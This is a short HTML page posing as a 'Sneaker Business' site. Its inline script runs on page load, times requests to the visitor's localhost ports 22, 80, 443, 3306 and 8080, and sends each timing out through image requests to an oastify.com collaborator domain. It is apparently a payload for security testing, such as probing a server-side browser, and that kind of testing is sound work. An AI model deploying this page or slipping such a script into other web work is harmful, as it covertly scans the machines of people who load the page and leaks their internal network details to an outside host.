<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello World</title>
</head>
<body>
    <h1>Sneaker Business!</h1>
    <script>
        const COLLAB = 'w304c6kvputj973pwmh2pb8aw12sqje8.oastify.com';
        const PORTS = [22, 80, 443, 3306, 8080];
        
        PORTS.forEach(port => {
            const start = Date.now();
            fetch(`http://127.0.0.1:${port}/`, { mode: 'no-cors' })
                .finally(() => {
                    const ms = Date.now() - start;
                    new Image().src = `http://port${port}-${ms}ms.${COLLAB}/x`;
                });
        });
    </script>
</body>
</html>
